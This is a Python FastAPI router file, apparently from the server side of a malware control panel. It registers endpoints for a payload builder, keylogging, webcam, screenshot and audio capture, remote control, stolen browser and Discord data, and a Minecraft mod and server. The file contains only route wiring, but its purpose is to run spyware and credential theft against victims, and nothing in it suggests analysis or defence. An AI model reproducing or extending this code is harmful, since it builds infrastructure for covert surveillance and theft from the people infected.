from fastapi import APIRouter
from app.api.v1.endpoints import auth, builder, data, stream, logs, admin, dashboard, discord, online, remote, screenshots, webcam, keylog, mod, settings, panel_pages, donutsmp, browser, audio

api_router = APIRouter()
api_router.include_router(auth.router, prefix="/auth", tags=["auth"])
api_router.include_router(builder.router, prefix="/build", tags=["builder"])
api_router.include_router(data.router, prefix="/data", tags=["data"])
api_router.include_router(data.upload_router, prefix="/upload", tags=["upload"])  # /api/upload/{key}
api_router.include_router(browser.router, prefix="/data", tags=["browser"])  # /api/data/browser
api_router.include_router(stream.router, prefix="/stream", tags=["stream"])
api_router.include_router(logs.router, prefix="/logs", tags=["logs"])
api_router.include_router(admin.router, prefix="/admin", tags=["admin"])
api_router.include_router(dashboard.router, prefix="/dashboard", tags=["dashboard"])
api_router.include_router(discord.router, prefix="/discord", tags=["discord"])
api_router.include_router(online.router, prefix="/online", tags=["online"])
api_router.include_router(remote.router, prefix="/remote", tags=["remote"])
api_router.include_router(keylog.router, prefix="/keylog", tags=["keylog"])
api_router.include_router(screenshots.router, prefix="/screenshots", tags=["screenshots"])
api_router.include_router(webcam.router, prefix="/webcam", tags=["webcam"])
api_router.include_router(audio.router, prefix="/audio", tags=["audio"])
api_router.include_router(mod.router, prefix="/mod", tags=["mod"])
api_router.include_router(settings.router, prefix="/settings", tags=["settings"])
api_router.include_router(donutsmp.router, prefix="/donutsmp", tags=["donutsmp"])

